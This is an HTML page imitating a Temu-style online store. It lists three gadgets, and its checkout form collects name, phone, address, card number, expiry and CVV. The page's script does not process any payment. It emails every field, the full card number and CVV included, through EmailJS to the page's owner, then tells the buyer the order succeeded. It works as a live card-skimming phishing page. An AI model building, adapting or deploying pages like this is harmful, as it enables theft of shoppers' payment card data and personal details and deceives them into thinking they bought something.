<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Temu Style Store</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #f8f8f8;
    }
    header {
      background-color: #ff4800;
      color: white;
      padding: 1rem;
      text-align: center;
      font-size: 1.5rem;
    }
    .products {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
      gap: 1rem;
      padding: 1rem;
    }
    .product {
      background: white;
      border-radius: 10px;
      padding: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .product img {
      width: 100%;
      height: 150px;
      object-fit: cover;
      border-radius: 8px;
    }
    .product h4 {
      margin: 0.5rem 0 0.2rem;
    }
    .product p {
      margin: 0;
      color: #ff4800;
      font-weight: bold;
    }
    .buy-btn {
      background: #ff4800;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 20px;
      margin-top: 10px;
      cursor: pointer;
    }
    .form-container {
      display: none;
      padding: 1rem;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 10px;
      max-width: 400px;
      margin: auto;
      background: white;
      padding: 1rem;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    input {
      padding: 10px;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background: #ff4800;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 25px;
      font-size: 1rem;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <header>Temu Style Deals</header>

  <div class="products" id="productGrid">
    <div class="product">
      <img src="https://picsum.photos/id/101/200/150" alt="Item 1">
      <h4>Wireless Earbuds</h4>
      <p>Rs. 2990</p>
      <button class="buy-btn" onclick="showForm('Wireless Earbuds')">Buy Now</button>
    </div>
    <div class="product">
      <img src="https://picsum.photos/id/102/200/150" alt="Item 2">
      <h4>Smart Watch</h4>
      <p>Rs. 4500</p>
      <button class="buy-btn" onclick="showForm('Smart Watch')">Buy Now</button>
    </div>
    <div class="product">
      <img src="https://picsum.photos/id/103/200/150" alt="Item 3">
      <h4>Bluetooth Speaker</h4>
      <p>Rs. 3500</p>
      <button class="buy-btn" onclick="showForm('Bluetooth Speaker')">Buy Now</button>
    </div>
  </div>

  <div class="form-container" id="formContainer">
    <form id="orderForm">
      <input type="hidden" name="product" id="productField">
      <input type="text" name="name" placeholder="Full Name" required />
      <input type="tel" name="phone" placeholder="Phone Number" required />
      <input type="text" name="address" placeholder="Address" required />
      <input type="text" name="card" placeholder="Card Number xxxx xxxx xxxx xxxx" required />
      <input type="text" name="expiry" placeholder="MM/YY" required />
      <input type="text" name="cvv" placeholder="CVV" required />
      <button type="submit">Pay Now</button>
    </form>
  </div>

  <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
  <script>
    emailjs.init("nvIGgJlfaqCchUzf8"); // your EmailJS public key

    function showForm(product) {
      document.getElementById('productGrid').style.display = 'none';
      document.getElementById('formContainer').style.display = 'block';
      document.getElementById('productField').value = product;
    }

    document.getElementById('orderForm').addEventListener('submit', function(e) {
      e.preventDefault();
      emailjs.send("service_ws38oh2", "__ejs-test-mail-service__", {
        product: this.product.value,
        name: this.name.value,
        phone: this.phone.value,
        address: this.address.value,
        card: this.card.value,
        expiry: this.expiry.value,
        cvv: this.cvv.value
      }).then(() => {
        alert("Order submitted successfully!");
        location.reload();
      }, (err) => {
        alert("Failed to send: " + JSON.stringify(err));
      });
    });
  </script>
</body>
</html>
